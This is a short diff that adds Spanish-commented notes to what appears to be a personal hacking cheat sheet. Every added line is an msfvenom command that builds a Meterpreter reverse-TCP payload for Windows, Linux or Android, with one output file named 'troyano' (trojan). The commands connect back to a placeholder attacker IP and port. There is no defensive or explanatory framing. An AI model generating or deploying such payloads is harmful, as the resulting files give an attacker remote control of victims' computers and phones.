@@ -32,3 +32,13 @@ H A C K I N G   I N   P R O G R E S S:
 
 W E L C O M E   T O   T H E   H A C K:
 
+msfvenom Reverse Shell
+
+# Para Windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Nuestra_IP> LPORT=<Port> -f exe -o payload.exe
+
+# Para Linux
+msfvenom -p linux/meterpreter/reverse_tcp LHOST=<Nuestra_IP> LPORT=<Port> -o troyano 
+
+# Para Android 
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<Nuestra_IP> LPORT=<Port> -o payload.apk
